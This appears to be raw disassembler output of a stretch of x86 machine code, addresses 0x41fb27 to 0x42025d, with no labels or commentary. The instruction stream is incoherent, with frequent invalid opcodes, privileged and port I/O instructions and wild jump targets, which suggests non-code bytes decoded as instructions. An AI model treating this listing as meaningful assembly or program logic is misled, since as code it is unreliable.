  41fb27:	inc    eax
  41fb28:	addr16 cwde 
  41fb2a:	shl    BYTE PTR [edi],cl
  41fb2c:	pop    es
  41fb2d:	add    al,bh
  41fb2f:	ficom  WORD PTR [edi+ebp*8+0x47726567]
  41fb36:	push   es
  41fb37:	ds ins BYTE PTR es:[di],dx
  41fb3a:	add    BYTE PTR gs:[edi],bl
  41fb3d:	inc    esp
  41fb3e:	dec    eax
  41fb3f:	std    
  41fb40:	(bad)  
  41fb42:	outs   dx,DWORD PTR ds:[esi]
  41fb43:	jne    0x41fba7
  41fb45:	xchg   DWORD PTR [ebx+0x75],eax
  41fb48:	jb     0x41fbbc
  41fb4a:	outs   dx,BYTE PTR gs:[esi]
  41fb4c:	arpl   WORD PTR [esi],si
  41fb4e:	sbb    al,0x85
  41fb50:	rcl    bh,0x99
  41fb53:	fcom   DWORD PTR [ecx-0x50]
  41fb56:	jmp    0xfea24b12
  41fb5b:	addr16 and eax,0x9dc0cd84
  41fb61:	push   edi
  41fb62:	lods   al,BYTE PTR ds:[esi]
  41fb63:	rcr    BYTE PTR [ecx],0x58
  41fb66:	mov    ch,0xf
  41fb68:	or     eax,0x297d8c
  41fb6d:	gs popa 
  41fb6f:	outs   dx,BYTE PTR ds:[esi]
  41fb70:	pop    ds
  41fb71:	lahf   
  41fb72:	in     al,0x1f
  41fb74:	dec    ebx
  41fb75:	adc    edi,DWORD PTR [edi]
  41fb77:	push   ebp
  41fb78:	outs   dx,BYTE PTR ds:[esi]
  41fb79:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  41fb7d:	inc    esp
  41fb7e:	arpl   WORD PTR gs:[ecx-0x20],bp
  41fb82:	loope  0x41fbba
  41fb84:	push   es
  41fb85:	pushf  
  41fb86:	scas   eax,DWORD PTR es:[edi]
  41fb87:	and    al,0x30
  41fb89:	inc    esi
  41fb8a:	and    DWORD PTR [eax-0x30],0xb468cfa6
  41fb91:	je     0x41fb43
  41fb93:	inc    edi
  41fb94:	cmp    ah,0x86
  41fb97:	leave  
  41fb98:	inc    edx
  41fb99:	jns    0x41fbd2
  41fb9b:	push   edi
  41fb9c:	outs   dx,DWORD PTR ds:[esi]
  41fb9d:	jb     0x41fc03
  41fb9f:	xor    BYTE PTR [eax+0x27188837],dh
  41fba5:	add    eax,0xcee110b9
  41fbaa:	aaa    
  41fbab:	ss xor al,0xf7
  41fbae:	fdivp  st(0),st
  41fbb0:	adc    dh,ch
  41fbb2:	sub    al,0x60
  41fbb4:	nop
  41fbb5:	adc    eax,0xbc2e1805
  41fbba:	test   DWORD PTR [edx],ebx
  41fbbc:	jmp    0x41fbcb
  41fbbe:	sti    
  41fbbf:	inc    edx
  41fbc0:	out    0x28,eax
  41fbc2:	jb     0x41fbc0
  41fbc4:	pop    edx
  41fbc5:	pusha  
  41fbc6:	call   DWORD PTR [edi+esi*2]
  41fbc9:	push   ss
  41fbca:	xor    BYTE PTR [eax+0x35069dd7],0x42
  41fbd1:	out    0x1c,al
  41fbd3:	std    
  41fbd4:	fcmovbe st,st(7)
  41fbd6:	mov    bh,0x40
  41fbd8:	push   edx
  41fbd9:	stos   BYTE PTR es:[edi],al
  41fbda:	inc    eax
  41fbdb:	sti    
  41fbdc:	(bad)  
  41fbdd:	fs mov edx,0x9e416c30
  41fbe3:	out    0x60,al
  41fbe5:	das    
  41fbe6:	add    DWORD PTR [esi],ecx
  41fbe8:	inc    eax
  41fbe9:	loopne 0x41fc36
  41fbeb:	jge    0x41fbd6
  41fbed:	jmp    0x41fc60
  41fbef:	(bad)  
  41fbf0:	stc    
  41fbf1:	xchg   ebp,eax
  41fbf2:	cmp    ecx,DWORD PTR [ebp+0x8e4db92]
  41fbf8:	fstp   QWORD PTR [edx*4-0x5a3f0604]
  41fbff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc00:	sahf   
  41fc01:	or     al,0x4b
  41fc03:	pop    ds
  41fc04:	mov    ds:0x57c77bb,eax
  41fc09:	rcr    DWORD PTR [edx],cl
  41fc0b:	les    ecx,FWORD PTR [eax+0x56]
  41fc0e:	fld    QWORD PTR [ecx]
  41fc10:	add    BYTE PTR [ebx-0x72f3d01a],0x61
  41fc17:	je     0x41fc65
  41fc19:	mov    al,ds:0x5ec90e1a
  41fc1e:	fiadd  WORD PTR [edi+0x6b3e1015]
  41fc24:	or     BYTE PTR [edi-0x96facee],ch
  41fc2a:	(bad)  
  41fc2b:	and    dl,dh
  41fc2d:	sub    eax,0xb8c840d
  41fc32:	dec    esp
  41fc33:	and    eax,0xa598740
  41fc38:	jb     0x41fc96
  41fc3a:	inc    ebp
  41fc3b:	and    ebx,ebp
  41fc3d:	dec    esp
  41fc3e:	dec    ebp
  41fc3f:	inc    ebp
  41fc40:	ds clc 
  41fc42:	std    
  41fc43:	push   edi
  41fc44:	in     eax,dx
  41fc45:	cmp    eax,0x6933203
  41fc4a:	push   ebx
  41fc4b:	and    eax,ecx
  41fc4d:	inc    edi
  41fc4e:	add    edi,edi
  41fc50:	inc    ecx
  41fc51:	outs   dx,BYTE PTR ds:[esi]
  41fc52:	jns    0x41fc4f
  41fc54:	xor    al,BYTE PTR [ebp+0x23]
  41fc57:	std    
  41fc58:	and    BYTE PTR [edi+0x6],al
  41fc5b:	push   edx
  41fc5c:	gs pushw ds
  41fc5f:	enter  0xbb10,0xa4
  41fc63:	jg     0x41fc6a
  41fc65:	cmp    al,0x70
  41fc67:	push   0xffffffb3
  41fc69:	fiadd  WORD PTR [ebx]
  41fc6b:	or     dh,BYTE PTR [ebx+0x8]
  41fc6e:	sar    BYTE PTR [esi+0x2],1
  41fc71:	cmp    BYTE PTR ds:0xdbfa6c25,0x60
  41fc78:	cs mov ebx,gs
  41fc7b:	outs   dx,DWORD PTR ds:[esi]
  41fc7c:	xor    BYTE PTR [esi-0x1f],cl
  41fc7f:	push   ecx
  41fc80:	pushf  
  41fc81:	xor    dl,BYTE PTR [ecx-0x5212bf37]
  41fc87:	les    edi,FWORD PTR [edi]
  41fc89:	xor    eax,0x1cbe56bf
  41fc8e:	push   ds
  41fc8f:	push   0x47437e20
  41fc94:	les    ecx,FWORD PTR [eax]
  41fc96:	ret    0x7620
  41fc99:	or     eax,0x16db1ec
  41fc9e:	dec    ebp
  41fc9f:	push   ebp
  41fca0:	cmp    al,dl
  41fca2:	fmul   DWORD PTR [ebx-0x7d]
  41fca5:	xchg   esi,eax
  41fca6:	jno    0x41fca9
  41fca8:	push   esp
  41fca9:	xor    bh,BYTE PTR [eax+esi*8-0x75]
  41fcad:	add    al,0x98
  41fcaf:	fild   QWORD PTR [edi]
  41fcb1:	push   0xffffffe1
  41fcb3:	jle    0x41fd1d
  41fcb5:	aas    
  41fcb6:	shr    BYTE PTR [esi],0xff
  41fcb9:	jne    0x41fc48
  41fcbb:	(bad)  [eax+0x72ebe889]
  41fcc1:	xchg   edi,eax
  41fcc2:	push   ecx
  41fcc3:	or     esp,eax
  41fcc5:	inc    esi
  41fcc6:	or     ebp,esi
  41fcc8:	mov    eax,0x1f094660
  41fccd:	das    
  41fcce:	fst    st(4)
  41fcd0:	outs   dx,DWORD PTR ds:[esi]
  41fcd1:	push   ecx
  41fcd2:	jne    0x41fcc5
  41fcd4:	(bad)  
  41fcd5:	ins    BYTE PTR es:[edi],dx
  41fcd6:	or     DWORD PTR [ebx-0x783a992c],ecx
  41fcdc:	push   0x29
  41fcde:	inc    eax
  41fcdf:	mov    eax,0x10221002
  41fce4:	(bad)  
  41fce5:	(bad)  
  41fce6:	xchg   ebx,eax
  41fce7:	xlat   BYTE PTR ds:[ebx]
  41fce8:	sbb    al,0xeb
  41fcea:	cmp    ebp,ebx
  41fcec:	int3   
  41fced:	inc    DWORD PTR [ebp+ecx*1+0x78576fc4]
  41fcf4:	or     eax,0xb866087d
  41fcf9:	xlat   BYTE PTR ds:[ebx]
  41fcfa:	pop    esp
  41fcfb:	clc    
  41fcfc:	cmp    edi,DWORD PTR [ebx+0x4]
  41fcff:	je     0x41fd20
  41fd01:	clc    
  41fd02:	(bad)  
  41fd03:	adc    BYTE PTR [edi-0x7a],dl
  41fd06:	nop
  41fd07:	dec    edx
  41fd08:	in     al,dx
  41fd09:	mov    ebp,DWORD PTR [edx-0x8]
  41fd0c:	xchg   DWORD PTR [edx-0x3e11f524],esi
  41fd12:	(bad)  
  41fd13:	pop    ss
  41fd14:	pop    ss
  41fd15:	xchg   ecx,eax
  41fd16:	in     al,0x70
  41fd18:	ins    DWORD PTR es:[edi],dx
  41fd19:	or     ecx,esp
  41fd1b:	jle    0x41fd13
  41fd1d:	inc    edi
  41fd1e:	inc    eax
  41fd1f:	adc    eax,0xd0386bba
  41fd24:	inc    ebp
  41fd25:	dec    eax
  41fd26:	lea    esp,[edi+esi*2+0x5214f83f]
  41fd2d:	add    edx,0x448ae070
  41fd33:	add    dl,dh
  41fd35:	add    BYTE PTR [ecx-0x66fbca41],0x7f
  41fd3c:	mov    esp,ecx
  41fd3e:	mov    esi,0xc8c1288b
  41fd43:	out    0xe0,al
  41fd45:	call   DWORD PTR [ebp+0xc]
  41fd48:	mov    dl,BYTE PTR [edx]
  41fd4a:	add    al,0x24
  41fd4c:	ret    
  41fd4d:	xchg   DWORD PTR ds:0x5d17106e,eax
  41fd53:	pop    ss
  41fd54:	rol    DWORD PTR [ebp-0x4],0x1
  41fd58:	aad    0x55
  41fd5a:	sti    
  41fd5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd5c:	fisubr DWORD PTR [eax+ecx*8-0x77]
  41fd60:	std    
  41fd61:	xchg   ebp,ebp
  41fd63:	xor    al,0x9a
  41fd65:	inc    eax
  41fd66:	add    al,0x71
  41fd68:	and    eax,esp
  41fd6a:	inc    eax
  41fd6b:	outs   dx,BYTE PTR ds:[esi]
  41fd6c:	push   ss
  41fd6d:	lock adc eax,0x6c3804e0
  41fd73:	push   edi
  41fd74:	mov    ecx,DWORD PTR ds:0x79008cff
  41fd7a:	or     al,0x6
  41fd7c:	retf   0x8ef3
  41fd7f:	in     eax,dx
  41fd80:	inc    ecx
  41fd81:	sub    BYTE PTR ss:[edx+ecx*4-0x44],0xa8
  41fd87:	mov    esp,es
  41fd89:	fldenv [esi+0x1c]
  41fd8c:	sbb    DWORD PTR [esi],ebx
  41fd8e:	jle    0x41fd98
  41fd90:	sbb    esp,DWORD PTR [esp+eiz*2]
  41fd93:	xor    DWORD PTR [ecx],0x80771bec
  41fd99:	das    
  41fd9a:	shl    BYTE PTR [ecx-0x60],cl
  41fd9d:	mov    dl,0xbe
  41fd9f:	ror    DWORD PTR [ecx+0x839c354],cl
  41fda5:	dec    ebp
  41fda6:	cmc    
  41fda7:	lods   al,BYTE PTR ds:[esi]
  41fda8:	add    esp,ebp
  41fdaa:	push   ss
  41fdab:	ret    
  41fdac:	xor    eax,ebx
  41fdae:	cmp    DWORD PTR [ebx+0xf7b4ed6],esi
  41fdb4:	ret    0x67b8
  41fdb7:	inc    eax
  41fdb8:	xchg   edi,eax
  41fdb9:	cmp    eax,0x1537a904
  41fdbe:	fcomp  QWORD PTR [ebx+0x69]
  41fdc1:	mov    ebp,0xffc87f9b
  41fdc6:	aas    
  41fdc7:	pop    ss
  41fdc8:	inc    esi
  41fdc9:	push   eax
  41fdca:	sbb    DWORD PTR [eax+0x5f],0xffffff9a
  41fdce:	ins    DWORD PTR es:[edi],dx
  41fdcf:	mov    WORD PTR [esi],gs
  41fdd1:	aas    
  41fdd2:	loopne 0x41fe04
  41fdd4:	push   0x7afee015
  41fdd9:	push   cs
  41fdda:	dec    ebp
  41fddb:	jb     0x41fde4
  41fddd:	or     al,0xd4
  41fddf:	jbe    0x41fd65
  41fde1:	inc    ebx
  41fde2:	retf   0xbf65
  41fde5:	mov    eax,0xd4d0d6bf
  41fdea:	add    BYTE PTR [eax],bh
  41fdec:	jle    0x41fd85
  41fdee:	cld    
  41fdef:	clc    
  41fdf0:	out    dx,al
  41fdf1:	sbb    cl,BYTE PTR [esi+0x79a120dc]
  41fdf7:	fwait
  41fdf8:	xchg   edx,eax
  41fdf9:	sti    
  41fdfa:	outs   dx,BYTE PTR ds:[esi]
  41fdfb:	outs   dx,DWORD PTR ds:[esi]
  41fdfc:	inc    edi
  41fdfd:	sub    BYTE PTR [eax],bh
  41fdff:	pop    eax
  41fe00:	xchg   esi,eax
  41fe01:	cmp    eax,edx
  41fe03:	setg   BYTE PTR [ecx+0x26]
  41fe07:	cmp    BYTE PTR [edx-0x74be01e4],al
  41fe0d:	test   BYTE PTR [eax+0x26d29dad],bh
  41fe13:	adc    cl,BYTE PTR [ebx-0x368a2632]
  41fe19:	test   BYTE PTR [ecx],al
  41fe1b:	repnz sbb cl,ah
  41fe1e:	(bad)  
  41fe1f:	out    dx,al
  41fe20:	jb     0x41fe48
  41fe22:	bound  edx,QWORD PTR [ebx-0x1088a8ad]
  41fe28:	mov    cl,0x56
  41fe2a:	dec    edi
  41fe2b:	or     edx,DWORD PTR [edx-0x57c0b798]
  41fe31:	jno    0x41fdd1
  41fe33:	sub    al,0x34
  41fe35:	out    dx,al
  41fe36:	sbb    BYTE PTR [eax-0x14778516],bh
  41fe3c:	sbb    al,0x53
  41fe3e:	sbb    cl,BYTE PTR [ecx]
  41fe40:	jmp    0xc457d077
  41fe45:	retf   0xe32f
  41fe48:	or     eax,0xc567f846
  41fe4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe4e:	gs sub al,0x39
  41fe51:	dec    esp
  41fe52:	jmp    0x41fed2
  41fe54:	out    dx,eax
  41fe55:	popa   
  41fe56:	iret   
  41fe57:	inc    ebx
  41fe58:	into   
  41fe59:	das    
  41fe5a:	and    eax,esi
  41fe5c:	sbb    BYTE PTR [eax+0x79],ch
  41fe5f:	jne    0x41fe3f
  41fe61:	outs   dx,DWORD PTR ds:[esi]
  41fe62:	xor    eax,0xffffffdb
  41fe65:	js     0x41fe1f
  41fe67:	mov    esp,0x2c08a3ac
  41fe6c:	mov    eax,0xc12cee4
  41fe71:	sub    eax,0xba7c2054
  41fe76:	hlt    
  41fe77:	lods   al,BYTE PTR ds:[esi]
  41fe78:	mov    DWORD PTR [eax],edi
  41fe7a:	xchg   edi,eax
  41fe7b:	punpckhdq mm4,QWORD PTR [ebp-0x2a57ebce]
  41fe82:	enter  0x706c,0x8e
  41fe86:	je     0x41feb7
  41fe88:	mov    ebx,0x569c19e8
  41fe8d:	rcr    al,1
  41fe8f:	xor    esi,DWORD PTR [esp+edi*8+0x5e54b0db]
  41fe96:	push   esi
  41fe97:	cmp    al,0x58
  41fe99:	sbb    al,0xe3
  41fe9b:	sar    BYTE PTR [ecx],0x42
  41fe9e:	or     eax,DWORD PTR [edi-0x3b]
  41fea1:	mov    eax,0x4791f0ff
  41fea6:	or     eax,DWORD PTR [ebx]
  41fea8:	jle    0x41fe54
  41feaa:	daa    
  41feab:	daa    
  41feac:	daa    
  41fead:	mov    bh,0xab
  41feaf:	shrd   DWORD PTR [ebp+0x2727afae],ebp,0x27
  41feb7:	daa    
  41feb8:	nop
  41feb9:	xchg   ecx,eax
  41feba:	xchg   edx,eax
  41febb:	xchg   ebx,eax
  41febc:	lea    esp,[edi]
  41febe:	daa    
  41febf:	daa    
  41fec0:	xchg   esp,eax
  41fec1:	xchg   ebp,eax
  41fec2:	xchg   esi,eax
  41fec3:	dec    DWORD PTR [ecx+0x1e]
  41fec6:	jb     0x41fed0
  41fec8:	push   edi
  41fec9:	mov    ecx,0x946838f0
  41fece:	jo     0x41ff2e
  41fed0:	enter  0xf0c0,0x38
  41fed4:	push   0x62c251ab
  41fed9:	outs   dx,DWORD PTR ds:[esi]
  41feda:	scas   eax,DWORD PTR es:[edi]
  41fedb:	in     al,0x15
  41fedd:	test   eax,0xdf0f01ac
  41fee2:	ds icebp 
  41fee4:	lds    edx,FWORD PTR [ecx+0x5c]
  41fee7:	cdq    
  41fee8:	cmp    al,0x1f
  41feea:	mov    eax,0xb584778c
  41feef:	sub    BYTE PTR [ecx+0x24],al
  41fef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fef3:	add    ch,BYTE PTR [edi]
  41fef5:	outs   dx,BYTE PTR ds:[esi]
  41fef6:	pop    es
  41fef7:	adc    esi,DWORD PTR [edx+0x45]
  41fefa:	icebp  
  41fefb:	cmp    al,0x7
  41fefd:	scas   eax,DWORD PTR es:[edi]
  41fefe:	jne    0x41ff24
  41ff00:	pop    es
  41ff01:	or     BYTE PTR [ebx+0x40],0x77
  41ff05:	jl     0x41fef8
  41ff07:	sub    BYTE PTR [eax-0x2bbfcd10],dh
  41ff0d:	icebp  
  41ff0e:	push   edi
  41ff0f:	inc    ebp
  41ff10:	pop    eax
  41ff11:	cmp    DWORD PTR [esp+edx*8],0x4c654af1
  41ff18:	loope  0x41ff1f
  41ff1a:	les    esp,FWORD PTR [ecx+0x6d]
  41ff1d:	outs   dx,DWORD PTR ds:[esi]
  41ff1e:	xor    dl,dh
  41ff20:	sub    bh,BYTE PTR [ecx+0x79]
  41ff23:	push   eax
  41ff24:	wrmsr  
  41ff26:	repnz mov cl,dh
  41ff29:	dec    esp
  41ff2a:	int3   
  41ff2b:	dec    ecx
  41ff2c:	loope  0x41ff74
  41ff2e:	cli    
  41ff2f:	mov    edi,0x72725590
  41ff34:	xchg   ecx,eax
  41ff35:	nop
  41ff36:	in     al,0xd
  41ff38:	jmp    0x814fcb5d
  41ff3d:	ds in  al,dx
  41ff3f:	mov    ecx,0xb768b902
  41ff44:	in     al,dx
  41ff45:	or     ebx,DWORD PTR [eax+ebp*2+0x704fbdf8]
  41ff4c:	outs   dx,BYTE PTR gs:[esi]
  41ff4e:	mov    bl,0x44
  41ff50:	repz daa 
  41ff52:	inc    esp
  41ff53:	repz in al,0xbb
  41ff56:	dec    esp
  41ff57:	or     DWORD PTR [ebx],0xc19caf72
  41ff5d:	ret    0x8b93
  41ff60:	pushf  
  41ff61:	clc    
  41ff62:	repnz les edx,FWORD PTR [eax-0x2348553e]
  41ff69:	sbb    DWORD PTR [esp+esi*4-0x61],0xf4aff417
  41ff71:	jae    0x41ff17
  41ff73:	and    BYTE PTR [eax+0x5e],bl
  41ff76:	jae    0x41ff29
  41ff78:	add    bh,BYTE PTR [ecx]
  41ff7a:	shl    ecx,1
  41ff7c:	dec    esp
  41ff7d:	hlt    
  41ff7e:	out    dx,eax
  41ff7f:	dec    esp
  41ff80:	hlt    
  41ff81:	rol    DWORD PTR [esi+0x5e],1
  41ff84:	nop
  41ff85:	pop    esi
  41ff86:	dec    esp
  41ff87:	imul   esi,DWORD PTR [ebx+0x74],0x6384afa4
  41ff8e:	add    eax,0x44e6a472
  41ff93:	sti    
  41ff94:	arpl   WORD PTR [ebx-0x15],di
  41ff97:	mov    ebx,0xbff504e7
  41ff9c:	imul   esp,DWORD PTR [ecx+0xa],0x11f504e4
  41ffa3:	pushf  
  41ffa4:	sub    al,0x28
  41ffa6:	inc    esi
  41ffa7:	das    
  41ffa8:	mov    cl,BYTE PTR [ecx-0x3a]
  41ffab:	jae    0x41ff7e
  41ffad:	cmp    ch,dh
  41ffaf:	fs mov edi,0xb9e81074
  41ffb5:	push   edx
  41ffb6:	add    eax,0x360857
  41ffbb:	ds dec edi
  41ffbd:	sub    DWORD PTR [edx],0x1646026e
  41ffc3:	xor    al,0x5
  41ffc5:	push   esp
  41ffc6:	iret   
  41ffc7:	inc    ebp
  41ffc8:	ror    BYTE PTR [ebx+edx*4],cl
  41ffcb:	(bad)  
  41ffcc:	enter  0x24c8,0x4d
  41ffd0:	loope  0x42002f
  41ffd2:	and    eax,0xae0bb660
  41ffd7:	dec    ebp
  41ffd8:	in     al,dx
  41ffd9:	pop    ebx
  41ffda:	div    DWORD PTR [edx+0x4caff620]
  41ffe0:	pop    ds
  41ffe1:	sub    al,0x82
  41ffe3:	pop    esi
  41ffe4:	mov    ch,0xf7
  41ffe6:	push   ss
  41ffe7:	cmp    al,BYTE PTR [esi]
  41ffe9:	add    al,0xaf
  41ffeb:	aam    0x3
  41ffed:	push   es
  41ffee:	cmp    al,0x4f
  41fff0:	jmp    0x420070
  41fff2:	add    al,0x6
  41fff4:	in     al,dx
  41fff5:	add    BYTE PTR [edx],al
  41fff7:	or     BYTE PTR ds:0xfef4335d,0xff
  41fffe:	mov    al,ds:0xe3042205
  420003:	push   eax
  420004:	pop    edx
  420005:	jae    0x420072
  420007:	ffree  st(0)
  420009:	je     0x41ffe7
  42000b:	mov    ds:0x2507c796,al
  420010:	ret    0x183f
  420013:	pop    es
  420014:	or     DWORD PTR [ecx+0x7],esi
  420017:	inc    ebx
  420018:	ins    BYTE PTR es:[edi],dx
  420019:	popa   
  42001a:	mov    edi,0x76c8860f
  42001f:	outs   dx,DWORD PTR ds:[esi]
  420020:	je     0x42004e
  420022:	pmulhrw mm1,QWORD PTR [ecx-0x1]
  420027:	std    
  420028:	adc    al,0xa1
  42002a:	jae    0x42006d
  42002c:	fs popa 
  42002e:	jo     0x420088
  420030:	jb     0x41ffb2
  420032:	dec    esi
  420033:	add    DWORD PTR [edi+ebp*1],esi
  420036:	pushf  
  420037:	jae    0x420025
  420039:	push   edx
  42003a:	shl    BYTE PTR [eax+0x11ffb0b9],1
  420040:	sahf   
  420041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420042:	add    BYTE PTR [eax],ah
  420044:	scas   eax,DWORD PTR es:[edi]
  420045:	cmp    eax,0xeb6dda82
  42004a:	mov    esi,0x2738af4
  42004f:	scas   eax,DWORD PTR es:[edi]
  420050:	xchg   DWORD PTR [edi+esi*8-0x56],esi
  420054:	push   es
  420055:	pop    ds
  420056:	mov    DWORD PTR [edx-0x879f8dd],eax
  42005c:	aam    0xf5
  42005e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42005f:	(bad)  
  420060:	dec    esi
  420061:	call   0xdc47a52e
  420066:	pop    es
  420067:	inc    esi
  420068:	push   es
  420069:	inc    ecx
  42006a:	stc    
  42006b:	sahf   
  42006c:	fstp   DWORD PTR [esi]
  42006e:	aas    
  42006f:	pusha  
  420070:	or     cl,BYTE PTR [edi]
  420072:	push   0xf5c06c0
  420077:	xor    al,0x9b
  420079:	int    0xa7
  42007b:	nop
  42007c:	clc    
  42007d:	adc    BYTE PTR [eax-0x37edbfef],al
  420083:	outs   dx,BYTE PTR ds:[esi]
  420084:	mov    bh,0xbd
  420086:	not    esp
  420088:	jbe    0x420082
  42008a:	push   es
  42008b:	sbb    al,0x6f
  42008d:	pop    es
  42008e:	js     0x420099
  420090:	push   ss
  420091:	fmulp  st(0),st
  420093:	data16 sti 
  420095:	callw  0x36a4
  420099:	je     0x4200a7
  42009b:	dec    eax
  42009c:	or     eax,0x38ac0e7c
  4200a1:	out    dx,eax
  4200a2:	mov    ebp,0xe0006fb
  4200a7:	push   cs
  4200a8:	push   es
  4200a9:	inc    esp
  4200aa:	xchg   esi,eax
  4200ab:	pushf  
  4200ac:	sahf   
  4200ad:	xor    BYTE PTR [eax+ebp*8+0x70e78151],bl
  4200b4:	test   BYTE PTR [ebx+0x8],0x54
  4200b8:	ret    
  4200b9:	mov    cl,0x6
  4200bb:	aaa    
  4200bc:	and    DWORD PTR [eax-0xbe2f851],edx
  4200c2:	mov    bh,cl
  4200c4:	fs and al,0xe4
  4200c7:	dec    eax
  4200c8:	test   BYTE PTR [esi+0x132d0e46],0xa1
  4200cf:	xchg   ebx,eax
  4200d0:	or     ecx,DWORD PTR [ecx+0x30]
  4200d3:	pushf  
  4200d4:	mov    al,dl
  4200d6:	call   0x2e78:0xf824afc9
  4200dd:	xor    DWORD PTR ss:[edi],edi
  4200e0:	int3   
  4200e1:	pop    ds
  4200e2:	mov    esp,0x91390930
  4200e7:	jl     0x420147
  4200e9:	test   al,0xf6
  4200eb:	or     BYTE PTR [ebx],dl
  4200ed:	cmp    eax,ebx
  4200ef:	out    0xdd,eax
  4200f1:	mov    al,0x15
  4200f3:	push   ds
  4200f4:	push   es
  4200f5:	call   0x60a116e6
  4200fa:	pop    ss
  4200fb:	push   es
  4200fc:	data16 jae 0x420085
  4200ff:	dec    edi
  420100:	mov    esp,0xac5f1890
  420105:	sbb    BYTE PTR [eax],ah
  420107:	sbb    DWORD PTR [edx+ebx*8-0x6f],edi
  42010b:	int    0x64
  42010d:	adc    esi,DWORD PTR [eax+0x13]
  420110:	or     al,0x14
  420112:	push   es
  420113:	dec    esp
  420114:	mov    eax,0x926f8614
  420119:	xor    ebx,DWORD PTR [edi+0x48]
  42011c:	push   ss
  42011d:	test   BYTE PTR [esi],dl
  42011f:	xchg   esp,eax
  420120:	push   ss
  420121:	pop    edi
  420122:	dec    edi
  420123:	repz mov esi,0xf086d429
  420129:	adc    esp,esi
  42012b:	push   ss
  42012c:	cmp    al,bl
  42012e:	xor    DWORD PTR [ecx+ebx*1+0x7d],0xffffffbe
  420133:	call   0xbf710450
  420138:	shl    ecx,1
  42013a:	sbb    DWORD PTR [eax+0x7],ebx
  42013d:	and    DWORD PTR [eax+edx*4],esp
  420140:	idiv   edi
  420142:	xor    al,0x51
  420144:	dec    eax
  420145:	call   0xfa09fa86
  42014a:	cmp    edi,DWORD PTR [eax+0x6f37d56b]
  420150:	pop    esp
  420151:	(bad)  
  420152:	test   al,0x6
  420154:	jae    0x42019e
  420156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420157:	jecxz  0x420105
  420159:	sbb    DWORD PTR [edi],ebx
  42015b:	dec    esp
  42015c:	sbb    bl,BYTE PTR [esi]
  42015e:	push   es
  42015f:	jae    0x420132
  420161:	ds loope 0x42016b
  420164:	push   esp
  420165:	inc    edi
  420166:	lods   al,BYTE PTR ds:[esi]
  420167:	(bad)  
  420169:	or     al,0x9
  42016b:	nop
  42016c:	iret   
  42016d:	or     al,dh
  42016f:	clc    
  420170:	cwde   
  420171:	xlat   BYTE PTR ds:[ebx]
  420172:	popf   
  420173:	out    0xd3,al
  420175:	push   es
  420176:	adc    al,0xb4
  420178:	sbb    eax,esp
  42017a:	(bad)  
  42017c:	push   cs
  42017d:	push   esi
  42017e:	inc    ecx
  42017f:	dec    ecx
  420180:	loop   0x42018f
  420182:	push   esp
  420183:	dec    eax
  420184:	add    dh,BYTE PTR [ebx]
  420186:	mov    ds,WORD PTR [eax+ebp*2-0x5dbb9c5]
  42018d:	out    dx,eax
  42018e:	inc    eax
  42018f:	cli    
  420190:	pusha  
  420191:	stc    
  420192:	xor    BYTE PTR [eax-0x62],cl
  420195:	dec    eax
  420196:	aam    0x1d
  420198:	inc    ecx
  420199:	jmp    0x501f:0xe4c171df
  4201a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201a1:	push   cs
  4201a2:	push   cs
  4201a3:	push   esp
  4201a4:	dec    ecx
  4201a5:	fs or  ch,0x9
  4201a9:	loop   0x4201a7
  4201ab:	dec    ebp
  4201ac:	fmul   DWORD PTR [edx]
  4201ae:	jb     0x420229
  4201b0:	push   ss
  4201b1:	add    eax,0xbcff0517
  4201b6:	das    
  4201b7:	fistp  QWORD PTR [edx+ebp*2-0xebc018]
  4201be:	pushf  
  4201bf:	sti    
  4201c0:	or     DWORD PTR [edx+edx*2+0x65],edx
  4201c4:	addr16 cs xchg ecx,eax
  4201c7:	sub    al,0xf8
  4201c9:	inc    edi
  4201ca:	jb     0x42023b
  4201cc:	jne    0x42023e
  4201ce:	ficom  WORD PTR [ebx+edi*8]
  4201d1:	aas    
  4201d2:	push   cs
  4201d3:	imul   ebx,DWORD PTR [esi-0x4b],0xfd14af24
  4201da:	or     dh,BYTE PTR [ebx+0x51]
  4201dd:	add    eax,esi
  4201df:	sbb    BYTE PTR [edi+0x4ca92cd9],0x7c
  4201e6:	stc    
  4201e7:	mov    BYTE PTR [ebp-0x32],dl
  4201ea:	xchg   ebx,eax
  4201eb:	lds    edx,FWORD PTR [edx-0x753c19ae]
  4201f1:	sbb    ch,dh
  4201f3:	adc    eax,ebx
  4201f5:	and    edi,ebx
  4201f7:	inc    ebx
  4201f8:	add    al,0x1c
  4201fa:	fdiv   st,st(7)
  4201fc:	or     BYTE PTR [ebx],bh
  4201fe:	xor    ecx,DWORD PTR [edx-0x48]
  420201:	xor    dh,al
  420203:	or     al,0xa7
  420205:	out    dx,eax
  420206:	sub    BYTE PTR [esi+0x7c80b206],dl
  42020c:	nop
  42020d:	loope  0x420250
  42020f:	sub    al,0x1d
  420211:	call   0xa72925d9
  420216:	sbb    ecx,DWORD PTR [eax+0xf04d9a5]
  42021c:	rcl    BYTE PTR [ebp+0x893a58a],0xc
  420223:	aad    0xdf
  420225:	or     BYTE PTR [edx],0x87
  420228:	fild   WORD PTR [eax+0x2d]
  42022b:	cmp    ecx,DWORD PTR [ecx-0x29]
  42022e:	or     cl,ah
  420230:	sbb    al,0x3b
  420232:	fmul   DWORD PTR [ebx-0x70]
  420235:	dec    ebx
  420236:	or     al,BYTE PTR [edx-0x69]
  420239:	(bad)  
  42023a:	jle    0x420296
  42023c:	rol    BYTE PTR [edi],1
  42023e:	addr16 (bad) 
  420240:	arpl   WORD PTR ds:0xbcf09bce,sp
  420246:	dec    ecx
  420247:	jmp    0x420221
  420249:	lods   eax,DWORD PTR ds:[esi]
  42024a:	xchg   edi,eax
  42024b:	push   cs
  42024c:	stos   DWORD PTR es:[edi],eax
  42024d:	(bad)  
  42024e:	or     ch,BYTE PTR [ecx]
  420250:	out    dx,eax
  420251:	int3   
  420252:	jge    0x42022f
  420254:	pusha  
  420255:	add    al,0xc8
  420257:	add    BYTE PTR [edx+0x20],dh
  42025a:	add    al,0x4
  42025c:	lods   eax,DWORD PTR ds:[esi]
  42025d:	popa   
